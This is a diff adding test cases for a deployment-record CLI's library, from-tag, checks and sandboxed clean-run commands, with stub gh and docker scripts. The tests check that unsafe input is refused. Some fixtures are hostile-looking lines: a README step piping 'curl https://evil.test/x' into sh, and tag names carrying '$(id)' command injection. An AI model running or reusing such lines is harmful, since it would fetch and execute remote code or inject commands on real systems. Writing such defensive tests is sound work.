@@ -24,11 +24,29 @@ d="$GH_STUB_DIR"
 echo "$*" >> "$d/calls.log"
 if [ -n "$GH_STUB_FAIL" ]; then echo "HTTP 502: bad gateway" >&2; exit 1; fi
 case "$1 $2" in
+  "api repos/{owner}/{repo}/deployments?sha="*) if [ -f "$d/tag-deploys.json" ]; then cat "$d/tag-deploys.json"; else echo "[]"; fi ;;
+  "api repos/{owner}/{repo}/releases/tags/"*) if [ -f "$d/release.json" ]; then cat "$d/release.json"; else echo "HTTP 404" >&2; exit 1; fi ;;
+  "api repos/{owner}/{repo}/actions/runs?"*) if [ -f "$d/runs.json" ]; then cat "$d/runs.json"; else echo '{"workflow_runs":[]}'; fi ;;
   "api repos/{owner}/{repo}/deployments?"*) cat "$d/deployments.json" ;;
   "api repos/{owner}/{repo}/deployments/"*) cat "$d/statuses.json" ;;
   *) echo "gh stub: no canned answer for: $*" >&2; exit 2 ;;
 esac
 `;
+
+// A docker that logs its argv and whatever arrives on stdin, then prints a canned result.
+const DOCKER_STUB = `#!/bin/sh
+d="$DOCKER_STUB_DIR"
+if [ "$1" = images ]; then cat "$d/images.txt" 2>/dev/null; exit 0; fi
+if [ "$1" = image ]; then [ -z "$DOCKER_STUB_NOIMAGE" ]; exit $?; fi
+if [ "$1" = kill ]; then echo "$2" > "$d/killed.txt"; exit 0; fi
+if [ -n "$DOCKER_STUB_HANG" ]; then exec sleep 30; fi
+printf '%s\\n' "$@" > "$d/argv.txt"
+cat > "$d/stdin.tar"
+echo "12 passed"
+exit "\${DOCKER_STUB_EXIT:-0}"
+`;
+
+const LIB_BLOCK = (extra = "") => "# x\n\n## Ship\n\n```yaml\ntargets:\n  - id: library\n    kind: tag-release\n" + extra + "```\n";
 
 const SHIP_BLOCK = "# x\n\n## Ship\n\n```yaml\ntargets:\n  - id: web\n    kind: deploy-on-merge\n    env: production\n    rollback:\n      triggers: [\"error rate above 2%\"]\n      steps: [\"redeploy the previous build\"]\n      rto: \"10 minutes\"\n```\n";
 
@@ -48,6 +66,8 @@ export function runShipDeployCases() {
   mkdirSync(stubBin, { recursive: true });
   writeFileSync(join(stubBin, "gh"), GH_STUB);
   chmodSync(join(stubBin, "gh"), 0o755);
+  writeFileSync(join(stubBin, "docker"), DOCKER_STUB);
+  chmodSync(join(stubBin, "docker"), 0o755);
   let n = 0;
   const add = (id, expect, ok, reason = "") => out.results.push({ id, expect, ok: !!ok, reason: ok ? "" : String(reason).slice(0, 500) });
   const git = (cwd, ...args) => spawnSync("git", args, { cwd, encoding: "utf8", env });
@@ -55,7 +75,7 @@ export function runShipDeployCases() {
     const repo = join(sandbox, `repo${++n}`);
     mkdirSync(repo, { recursive: true });
     git(repo, "init", "-q", "-b", "main");
-    for (const [p, c] of Object.entries({ ".gitkeep": "", ...files })) writeFileSync(join(repo, p), c);
+    for (const [p, c] of Object.entries({ ".gitkeep": "", ...files })) { mkdirSync(dirname(join(repo, p)), { recursive: true }); writeFileSync(join(repo, p), c); }
     git(repo, "add", "-A");
     git(repo, "commit", "-q", "-m", "init");
     return repo;
@@ -91,6 +111,10 @@ export function runShipDeployCases() {
     statusCases();
     githubCases();
     mierukaCases();
+    libraryCases();
+    fromTagCases();
+    checksCases();
+    cleanRunCases();
   } finally {
     rmSync(sandbox, { recursive: true, force: true });
   }
@@ -123,7 +147,7 @@ export function runShipDeployCases() {
     const r2 = ship(repo, ["deployed", "--target", "web", "--env", "staging", "--deployed-at", "2026-11-02T23:59:59-05:00"]);
     add("deployed/the key time is UTC", "20261103t045959z", r2.json?.evidence_key?.endsWith("-20261103t045959z"), r2.stdout + r2.stderr);
     const r3 = ship(repo, ["deployed", "--target", "web", "--env", "production"]);
-    add("deployed/no time given uses now", "a key ending in a UTC stamp", /-\d{8}t\d{6}z$/.test(r3.json?.evidence_key || ""), r3.stdout + r3.stderr);
+    add("deployed/R18 no time is refused and the options are named", "exit 1 naming all three", r3.status === 1 && /--deployed-at/.test(r3.stderr) && /--from-tag/.test(r3.stderr) && /--from-github/.test(r3.stderr), r3.stdout + r3.stderr);
     const r4 = ship(repo, ["deployed", "--target", "web", "--env", "production", "--deployed-at", "2026-11-02T10:15:30"]);
     add("deployed/a time with no offset is refused", "exit 1", r4.status === 1 && /offset/.test(r4.stderr), r4.stdout + r4.stderr);
   }
@@ -131,7 +155,7 @@ export function runShipDeployCases() {
   // R3 and the security items: the target, the env, the URL.
   function refusalCases() {
     const repo = mkrepo();
-    const base = ["deployed", "--target", "web", "--env", "production"];
+    const base = ["deployed", "--target", "web", "--env", "production", "--deployed-at", "2026-11-02T10:15:30+00:00"];
     let r = ship(repo, ["deployed", "--target", "mobile", "--env", "production"]);
     add("deployed/an unknown target is refused and the ids are listed", "exit 1 naming web", r.status === 1 && /web/.test(r.stderr) && noRecord(repo), r.stdout + r.stderr);
     r = ship(repo, ["deployed", "--target", "../web", "--env", "production"]);
@@ -150,8 +174,10 @@ export function runShipDeployCases() {
       r = ship(repo, ["deployed", "--target", "web", "--env", bad]);
       add(`deployed/env ${bad} is refused`, "exit 1", r.status === 1 && /--env/.test(r.stderr), r.stdout + r.stderr);
     }
-    r = ship(repo, ["deployed", "--target", "web"]);
-    add("deployed/manual without --env is refused", "exit 1", r.status === 1 && /--env/.test(r.stderr), r.stdout + r.stderr);
+    r = ship(mkrepo({ "CLAUDE.md": SHIP_BLOCK.replace("    env: production\n", "") }), ["deployed", "--target", "web", "--deployed-at", "2026-11-02T10:15:30+00:00"]);
+    add("deployed/a service with no env anywhere is refused", "exit 1", r.status === 1 && /--env/.test(r.stderr), r.stdout + r.stderr);
+    r = ship(repo, ["deployed", "--target", "web", "--deployed-at", "2026-11-02T10:15:30+00:00"]);
+    add("deployed/R19 the env comes from the target", "production from the target", r.status === 0 && detail(repo, r).env === "production" && detail(repo, r).env_source === "target", r.stdout + r.stderr);
     r = ship(repo, [...base, "--outcome", "great"]);
     add("deployed/an unknown outcome is refused", "exit 1", r.status === 1 && /outcome/.test(r.stderr), r.stdout + r.stderr);
     r = ship(repo, [...base, "--commit", "deadbeef"]);
@@ -163,7 +189,7 @@ export function runShipDeployCases() {
     git(bare, "init", "-q", "-b", "main");
     writeFileSync(join(bare, "a.txt"), "1\n");
     git(bare, "add", "-A"); git(bare, "commit", "-q", "-m", "i");
-    r = ship(bare, ["deployed", "--target", "web", "--env", "production"]);
+    r = ship(bare, ["deployed", "--target", "web", "--env", "production", "--deployed-at", "2026-11-02T10:15:30+00:00"]);
     add("deployed/a repo that ships nothing known refuses and says none", "exit 1", r.status === 1 && /none found/.test(r.stderr), r.stdout + r.stderr);
   }
 
@@ -173,7 +199,7 @@ export function runShipDeployCases() {
       const repo = mkrepo();
       const h = head(repo);
       setup?.(repo, h);
-      const r = ship(repo, ["deployed", "--target", "web", "--env", "production"]);
+      const r = ship(repo, ["deployed", "--target", "web", "--env", "production", "--deployed-at", "2026-11-02T10:15:30+00:00"]);
       return { repo, r, d: r.json ? detail(repo, r) : null, h };
     };
     const put = (repo, text) => {
@@ -265,14 +291,168 @@ export function runShipDeployCases() {
   function mierukaCases() {
     let repo = mkrepo({ "CLAUDE.md": SHIP_BLOCK, ".gitignore": ".mieruka/\n" });
     mkdirSync(join(repo, ".mieruka"), { recursive: true });
-    let r = ship(repo, ["deployed", "--target", "web", "--env", "production"]);
+    let r = ship(repo, ["deployed", "--target", "web", "--env", "production", "--deployed-at", "2026-11-02T10:15:30+00:00"]);
     const p = r.json?.mieruka;
     add("deployed/an ignored .mieruka copy is written", "the same manifest", r.status === 0 && p === `.mieruka/evidence/${r.json.evidence_key}/evidence.json`
       && readFileSync(join(repo, p), "utf8") === readFileSync(join(repo, r.json.path), "utf8"), r.stdout + r.stderr);
     repo = mkrepo();
     mkdirSync(join(repo, ".mieruka"), { recursive: true });
-    r = ship(repo, ["deployed", "--target", "web", "--env", "production"]);
+    r = ship(repo, ["deployed", "--target", "web", "--env", "production", "--deployed-at", "2026-11-02T10:15:30+00:00"]);
     add("deployed/.mieruka that is not ignored gets no copy and a reason", "mieruka null and why", r.status === 0 && r.json.mieruka === null && /not ignored/.test(r.json.why), r.stdout + r.stderr);
+  }
+
+  // R16, R19, AC7.
+  function libraryCases() {
+    const repo = mkrepo({ "CLAUDE.md": LIB_BLOCK() });
+    const file = (name, v) => { const p = join(sandbox, name); writeFileSync(p, JSON.stringify(v)); return p; };
+    const go = (checks) => ship(repo, ["deployed", "--target", "library", "--deployed-at", "2026-11-02T10:00:00Z", "--checks", file(`l${++n}.json`, checks)]);
+    for (const item of ["health endpoint returns 200", "Error rate is normal", "error-rate", "LATENCY", "logs are flowing", "log tail"]) {
+      const r = go([{ item, status: "pass" }]);
+      add(`library/AC7 ${item} is refused`, "exit 1 naming the three", r.status === 1 && /clean checkout/.test(r.stderr), r.stdout + r.stderr);
+    }
+    const r = go([{ item: "tests on a clean checkout of the tag", status: "pass" }, { item: "documented use runs", status: "pass" }, { item: "rollback dry run", status: "pass" }, { item: "changelog read", status: "pass" }]);
+    add("library/AC7 accepts its checks and records env release", "release and default", r.status === 0 && detail(repo, r).env === "release" && detail(repo, r).env_source === "default" && r.json.status === "pass", r.stdout + r.stderr);
+    const svc = mkrepo();
+    const s = ship(svc, ["deployed", "--target", "web", "--deployed-at", "2026-11-02T10:00:00Z", "--checks", file(`l${++n}.json`, [{ item: "health endpoint returns 200", status: "pass" }])]);
+    add("library/a service keeps its health check", "exit 0", s.status === 0, s.stdout + s.stderr);
+    const g = ship(repo, ["deployed", "--target", "library", "--env", "staging", "--deployed-at", "2026-11-02T10:00:01Z"]);
+    add("library/a named env is kept and says so", "staging, given", detail(repo, g).env === "staging" && detail(repo, g).env_source === "given", g.stdout + g.stderr);
+  }
+
+  // R17, AC8, the tag name item and the unchecked record.
+  function fromTagCases() {
+    const repo = mkrepo({ "CLAUDE.md": LIB_BLOCK() });
+    git(repo, "tag", "-a", "v1.1.0", "-m", "Release 1.1.0");
+    const h = head(repo);
+    const base = ["deployed", "--from-tag", "v1.1.0", "--target", "library"];
+    const stub = (files) => {
+      const d = join(sandbox, `stub${++n}`);
+      mkdirSync(d, { recursive: true });
+      for (const [f, c] of Object.entries(files)) writeFileSync(join(d, f), JSON.stringify(c));
+      return { GH_STUB_DIR: d };
+    };
+    const when = (files) => { const r = ship(repo, base, { env: stub(files) }); return r.json ? { ...detail(repo, r), r } : { r }; };
+    let d = when({ "tag-deploys.json": [{ id: 7, created_at: "2026-11-03T00:00:00Z" }], "statuses.json": [{ state: "success", created_at: "2026-11-03T01:00:00Z" }], "release.json": { published_at: "2026-11-03T02:00:00Z" } });
+    add("from-tag/a finished deployment wins", "github-deployment", d.time_source === "github-deployment" && d.deployed_at === "2026-11-03T01:00:00+00:00" && d.commit === h && d.outcome === "succeeded" && d.source === "tag", JSON.stringify(d));
+    d = when({ "tag-deploys.json": [{ id: 7, created_at: "2026-11-03T00:00:00Z" }], "statuses.json": [{ state: "in_progress", created_at: "2026-11-03T01:00:00Z" }], "release.json": { published_at: "2026-11-03T02:00:00Z" } });
+    add("from-tag/an unfinished deployment is skipped", "release", d.time_source === "release", JSON.stringify(d));
+    {
+      const dd = stub({ "release.json": { published_at: "2026-11-03T02:00:00Z" } });
+      ship(repo, base, { env: dd });
+      add("from-tag/the deployment query names the environment", "environment=release", /deployments\?sha=[0-9a-f]{40}&environment=release&/.test(readFileSync(join(dd.GH_STUB_DIR, "calls.log"), "utf8")), readFileSync(join(dd.GH_STUB_DIR, "calls.log"), "utf8"));
+    }
+    d = when({ "release.json": { published_at: "2026-11-03T02:00:00Z" } });
+    add("from-tag/then the release", "release", d.time_source === "release" && d.deployed_at === "2026-11-03T02:00:00+00:00", JSON.stringify(d));
+    d = when({ "runs.json": { workflow_runs: [{ head_branch: "main", created_at: "2026-11-03T03:00:00Z" }, { head_branch: "v1.1.0", created_at: "2026-11-03T04:00:00Z" }] } });
+    add("from-tag/AC8 then the tag's workflow run", "tag-push-run", d.time_source === "tag-push-run" && d.deployed_at === "2026-11-03T04:00:00+00:00", JSON.stringify(d));
+    d = when({ "runs.json": { workflow_runs: [{ head_branch: "main", created_at: "2026-11-03T03:00:00Z" }] } });
+    add("from-tag/AC8 then the tagger date", "tagger-date", d.time_source === "tagger-date", JSON.stringify(d));
+    const r = ship(repo, base, { env: { ...stub({}), GH_STUB_FAIL: "1" } });
+    add("from-tag/a gh failure moves down the ladder", "tagger-date", r.status === 0 && detail(repo, r).time_source === "tagger-date", r.stdout + r.stderr);
+    add("from-tag/no checks reads partial and says so", "partial", r.json?.status === "partial" && /no checks ran/.test(rec(repo, r).summary), r.stdout + r.stderr);
+    git(repo, "tag", "v1.1.1");
+    let l = ship(repo, ["deployed", "--from-tag", "v1.1.1", "--target", "library"], { env: stub({}) });
+    add("from-tag/a lightweight tag falls to the commit date", "commit-date", detail(repo, l).time_source === "commit-date", l.stdout + l.stderr);
+    const dir = stub({});
+    for (const bad of ["v1.0.0$(id)", "a#b--v1.0.0", "a&b--v1.0.0", "main"]) {
+      l = ship(repo, ["deployed", "--from-tag", bad, "--target", "library"], { env: dir });
+      add(`from-tag/${bad} is refused before any gh call`, "exit 1", l.status === 1 && !existsSync(join(dir.GH_STUB_DIR, "calls.log")), l.stdout + l.stderr);
+    }
+    l = ship(repo, ["deployed", "--from-tag", "v9.9.9", "--target", "library"], { env: dir });
+    add("from-tag/a tag the repo does not have is refused", "exit 1", l.status === 1, l.stdout + l.stderr);
+    l = ship(repo, [...base, "--deployed-at", "2026-11-02T10:00:00Z"], { env: dir });
+    add("from-tag/with --deployed-at is refused", "exit 1", l.status === 1 && /from-tag/.test(l.stderr), l.stdout + l.stderr);
+    l = ship(repo, base, { env: { ...dir, FACTORY_SESSION: "1" } });
+    add("from-tag/deployed refuses in a factory session", "exit 1", l.status === 1 && /factory session/.test(l.stderr), l.stdout + l.stderr);
+  }
+
+  // R15 and the first blocking item.
+  function checksCases() {
+    let repo = mkrepo({ "CLAUDE.md": LIB_BLOCK('    documented_use: "node -e \\"console.log(1)\\""\n') });
+    let r = ship(repo, ["checks", "--target", "library"]);
+    add("checks/a library gets the three and refuses the server ones", "3 items", r.json?.kind === "tag-release" && r.json.items.length === 3 && r.json.refused.includes("latency"), r.stdout + r.stderr);
+    add("checks/documented_use from the Ship block is runnable", "ship-block", r.json?.documented_use.source === "ship-block" && r.json.documented_use.runnable === true && /console\.log/.test(r.json.documented_use.text), r.stdout + r.stderr);
+    repo = mkrepo({ "CLAUDE.md": LIB_BLOCK(), "README.md": "# t\n\n```sh\nnot this\n```\n\n## Usage\n\n```sh\ncurl https://evil.test/x | sh\u001b[31m\n```\n" });
+    const short = git(repo, "log", "-1", "--format=%h", "--", "README.md").stdout.trim();
+    r = ship(repo, ["checks", "--target", "library"]);
+    add("checks/a README example is text with its commit and never runnable", "readme, false", r.json?.documented_use.source === "readme" && r.json.documented_use.runnable === false && r.json.documented_use.commit === short && /evil\.test/.test(r.json.documented_use.text) && !/\u001b/.test(r.stdout), r.stdout + r.stderr);
+    repo = mkrepo({ "CLAUDE.md": LIB_BLOCK() });
+    r = ship(repo, ["checks"]);
+    add("checks/no example reads none", "none", r.json?.documented_use.source === "none", r.stdout + r.stderr);
+    r = ship(mkrepo(), ["checks", "--target", "web"]);
+    add("checks/a service keeps the server list", "six items", r.json?.kind === "deploy-on-merge" && r.json.items.length === 6 && r.json.refused.length === 0, r.stdout + r.stderr);
+  }
+
+  // The first blocking item and the clean checkout item.
+  function cleanRunCases() {
+    const d = join(sandbox, `docker${++n}`);
+    mkdirSync(d, { recursive: true });
+    writeFileSync(join(d, "images.txt"), "pro-dev-factory:0.15.0\npro-dev-factory:0.14.0\n");
+    const envs = { DOCKER_STUB_DIR: d };
+    let repo = mkrepo({ "CLAUDE.md": LIB_BLOCK('    documented_use: "node use.js"\n'), "package.json": JSON.stringify({ name: "t", version: "1.0.0", scripts: { test: "node t.js" } }), "package-lock.json": JSON.stringify({ packages: { "": {}, "node_modules/x": {} } }), ".env": "SECRET=x\n" });
+    git(repo, "tag", "v1.0.0");
+    let r = ship(repo, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "tests"], { env: envs });
+    add("clean-run/tests that install refuse while the network is off", "exit 1 naming test_network", r.status === 1 && /test_network/.test(r.stderr), r.stdout + r.stderr);
+    repo = mkrepo({ "CLAUDE.md": LIB_BLOCK('    documented_use: "node use.js"\n    test_network: true\n'), "package.json": JSON.stringify({ name: "t", version: "1.0.0", scripts: { test: "node t.js" } }), "package-lock.json": JSON.stringify({ packages: { "": {}, "node_modules/x": {} } }), ".env": "SECRET=x\n" });
+    git(repo, "tag", "v1.0.0");
+    r = ship(repo, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "tests"], { env: envs });
+    const argv = existsSync(join(d, "argv.txt")) ? readFileSync(join(d, "argv.txt"), "utf8").split("\n") : [];
+    add("clean-run/runs the repo's tests in the newest image", "npm ci && npm test", r.status === 0 && r.json.exit === 0 && r.json.command === "npm ci && npm test" && r.json.image === "pro-dev-factory:0.15.0" && /12 passed/.test(r.json.tail), r.stdout + r.stderr);
+    add("clean-run/no mount, no env and no env file", "no -v -e --env-file --volume --mount",
+      argv[0] === "run" && !argv.some((a) => ["-v", "-e", "--env", "--env-file", "--volume", "--mount"].includes(a)) && argv.includes("--rm") && argv.includes("--cap-drop"), argv.join(" "));
+    const tar = existsSync(join(d, "stdin.tar")) ? readFileSync(join(d, "stdin.tar")).toString("latin1") : "";
+    add("clean-run/the tag's files arrive as a tar on stdin", "package.json in the tar", tar.includes("package.json"), String(tar.length));
+    add("clean-run/test_network keeps the network", "no --network", !argv.includes("--network"), argv.join(" "));
+    r = ship(repo, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "use"], { env: envs });
+    add("clean-run/--step use runs the Ship block's command", "node use.js", r.json?.command === "node use.js", r.stdout + r.stderr);
+    const useArgv = readFileSync(join(d, "argv.txt"), "utf8").split("\n");
+    add("clean-run/the documented use has no network", "--network none", useArgv.includes("--network") && useArgv[useArgv.indexOf("--network") + 1] === "none", useArgv.join(" "));
+    r = ship(repo, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "tests"], { env: { ...envs, DOCKER_STUB_HANG: "1", SHIP_CLEAN_RUN_TIMEOUT: "1" } });
+    add("clean-run/a timeout kills the container by name", "exit 1 and a kill", r.status === 1 && /timed out/.test(r.stderr) && /^ship-clean-/.test(readFileSync(join(d, "killed.txt"), "utf8")), r.stdout + r.stderr);
+    r = ship(repo, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "tests"], { env: { ...envs, DOCKER_STUB_EXIT: "125" } });
+    add("clean-run/docker's own failure refuses and is not a failed test", "exit 1", r.status === 1 && /confirm/.test(r.stderr), r.stdout + r.stderr);
+    {
+      const named = mkrepo({ "CLAUDE.md": LIB_BLOCK('    check_image: node:22\n    test_command: "npm test"\n') });
+      git(named, "tag", "v1.0.0");
+      const n1 = ship(named, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "tests"], { env: { ...envs, DOCKER_STUB_NOIMAGE: "1" } });
+      add("clean-run/a named image that is missing refuses", "exit 1", n1.status === 1 && /confirm/.test(n1.stderr), n1.stdout + n1.stderr);
+      const n2 = ship(named, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "tests"], { env: envs });
+      const a2 = readFileSync(join(d, "argv.txt"), "utf8").split("\n");
+      add("clean-run/a named test command has no network by default", "--network none", n2.status === 0 && a2[a2.indexOf("--network") + 1] === "none", a2.join(" "));
+      const pathed = mkrepo({ "CLAUDE.md": LIB_BLOCK("    path: pkgs/lib\n"), "pkgs/lib/.keep": "" });
+      mkdirSync(join(pathed, "pkgs", "lib"), { recursive: true });
+      writeFileSync(join(pathed, "pkgs", "lib", "package.json"), JSON.stringify({ name: "l", version: "1.0.0", scripts: { test: "node t.js" } }));
+      git(pathed, "add", "-A"); git(pathed, "commit", "-q", "-m", "pkg");
+      git(pathed, "tag", "v1.0.0");
+      const p1 = ship(pathed, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "tests"], { env: envs });
+      add("clean-run/a target's path is where its tests run", "cd pkgs/lib", p1.json?.command === "cd pkgs/lib && npm test", p1.stdout + p1.stderr);
+      const long = "x".repeat(500);
+      const lr = mkrepo({ "CLAUDE.md": LIB_BLOCK(`    documented_use: "${long}"\n`) });
+      git(lr, "tag", "v1.0.0");
+      const l1 = ship(lr, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "use"], { env: envs });
+      const l2 = ship(lr, ["checks", "--target", "library"]);
+      add("clean-run/a command longer than what is shown never runs", "exit 1, not runnable", l1.status === 1 && l2.json.documented_use.runnable === false, l1.stdout + l1.stderr);
+    }
+    r = ship(repo, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "tests"], { env: { ...envs, DOCKER_STUB_EXIT: "3" } });
+    add("clean-run/a failing run reports its exit", "exit 3", r.status === 0 && r.json.exit === 3, r.stdout + r.stderr);
+    r = ship(repo, ["clean-run", "--tag", "v1.0.0$(id)", "--target", "library", "--step", "tests"], { env: envs });
+    add("clean-run/a bad tag name is refused", "exit 1", r.status === 1, r.stdout + r.stderr);
+    r = ship(repo, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "rm"], { env: envs });
+    add("clean-run/an unknown step is refused", "exit 1", r.status === 1, r.stdout + r.stderr);
+    r = ship(repo, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "tests"], { env: { ...envs, FACTORY_SESSION: "1" } });
+    add("clean-run/refuses in a factory session", "exit 1", r.status === 1 && /factory session/.test(r.stderr), r.stdout + r.stderr);
+    const nodocker = join(sandbox, "nodocker");
+    mkdirSync(nodocker, { recursive: true });
+    writeFileSync(join(nodocker, "docker"), "#!/bin/sh\nexit 1\n");
+    chmodSync(join(nodocker, "docker"), 0o755);
+    r = ship(repo, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "tests"], { env: { PATH: `${nodocker}:${process.env.PATH}` } });
+    add("clean-run/no working docker refuses, with no host fallback", "exit 1", r.status === 1 && /confirm/.test(r.stderr), r.stdout + r.stderr);
+    repo = mkrepo({ "CLAUDE.md": LIB_BLOCK() });
+    git(repo, "tag", "v1.0.0");
+    r = ship(repo, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "use"], { env: envs });
+    add("clean-run/no documented_use refuses, so README text never runs", "exit 1", r.status === 1 && /documented_use/.test(r.stderr), r.stdout + r.stderr);
+    r = ship(repo, ["clean-run", "--tag", "v1.0.0", "--target", "library", "--step", "tests"], { env: envs });
+    add("clean-run/no test command refuses and names the key", "exit 1", r.status === 1 && /test_command/.test(r.stderr), r.stdout + r.stderr);
   }
 }
 
